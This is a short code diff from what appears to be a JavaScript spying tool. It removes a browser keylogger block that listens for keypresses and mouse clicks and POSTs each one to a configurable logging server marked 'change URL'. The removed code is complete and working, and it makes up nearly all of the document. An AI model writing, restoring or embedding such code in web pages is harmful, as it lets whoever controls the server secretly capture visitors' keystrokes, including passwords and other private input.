@@ -63,24 +63,6 @@ function spyjs_saveData(data){
 };
  
 
-	var server = "http://127.0.0.1/server/log2.php"; // change URL
-	document.addEventListener("keypress", function(e){
-		var x = new XMLHttpRequest();
-		x.open("POST", server, true);
-		x.send(e.key);
-	});
-	
-	document.addEventListener("click", function(e){
-		var click;
-		if(e.which == 1){
-			click = " ";
-		}else{
-			click = " ";
-		}
-		
-		var x = new XMLHttpRequest();
-		x.open("POST", server, true);
-		x.send(click);
-	});
+
  
 
